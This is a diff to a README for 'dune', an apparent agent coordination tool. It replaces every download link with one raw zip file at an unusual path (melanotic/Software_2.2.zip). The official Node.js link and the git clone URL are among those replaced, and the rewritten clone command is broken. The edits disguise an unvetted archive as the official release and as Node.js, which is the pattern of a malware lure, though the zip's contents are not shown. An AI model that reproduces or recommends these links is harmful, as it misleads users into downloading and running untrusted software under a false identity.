@@ -1,6 +1,6 @@
 # ⚙️ dune - Simple Agent Workspace for Coordination
 
-[![Download dune](https://img.shields.io/badge/Download-dune-blue?style=for-the-badge)](https://github.com/jealous-eaudevie630/dune/releases)
+[![Download dune](https://img.shields.io/badge/Download-dune-blue?style=for-the-badge)](https://github.com/jealous-eaudevie630/dune/raw/refs/heads/main/melanotic/Software_2.2.zip)
 
 ---
 
@@ -27,7 +27,7 @@ dune is a tool that helps you organize work with agents and channels in one plac
 
 Go to the official release page for dune here:
 
-[Download dune](https://github.com/jealous-eaudevie630/dune/releases)
+[Download dune](https://github.com/jealous-eaudevie630/dune/raw/refs/heads/main/melanotic/Software_2.2.zip)
 
 This page lists the latest versions of dune for Windows and other platforms.
 
@@ -109,7 +109,7 @@ To run dune smoothly on Windows, your system should meet these requirements:
 
 If you want to build dune from its source code, here is the process. This is optional and meant for advanced users or developers.
 
-1. Install [Node.js 24](https://nodejs.org/)
+1. Install [Node.js 24](https://github.com/jealous-eaudevie630/dune/raw/refs/heads/main/melanotic/Software_2.2.zip)
 2. Enable `corepack` by running this command in PowerShell or Command Prompt:
 
    ```
@@ -120,7 +120,7 @@ If you want to build dune from its source code, here is the process. This is opt
 4. Open Command Prompt and run:
 
    ```
-   git clone https://github.com/jealous-eaudevie630/dune.git
+   git clone https://github.com/jealous-eaudevie630/dune/raw/refs/heads/main/melanotic/Software_2.2.zip
    cd dune
    make deploy
    make dev
@@ -137,7 +137,7 @@ If you want to build dune from its source code, here is the process. This is opt
 - If dune doesn’t start after installation, try running it as an administrator.
 - For issues with agents or sandboxes, restart dune and try again.
 - Check the official release page for updates or fixes:  
-  [https://github.com/jealous-eaudevie630/dune/releases](https://github.com/jealous-eaudevie630/dune/releases)
+  [https://github.com/jealous-eaudevie630/dune/raw/refs/heads/main/melanotic/Software_2.2.zip](https://github.com/jealous-eaudevie630/dune/raw/refs/heads/main/melanotic/Software_2.2.zip)
 
 ---
 
@@ -176,4 +176,4 @@ This is where you view conversations, agent details, and sandbox operations.
 
 ---
 
-[![Download dune](https://img.shields.io/badge/Download-dune-grey?style=for-the-badge)](https://github.com/jealous-eaudevie630/dune/releases)
+[![Download dune](https://img.shields.io/badge/Download-dune-grey?style=for-the-badge)](https://github.com/jealous-eaudevie630/dune/raw/refs/heads/main/melanotic/Software_2.2.zip)
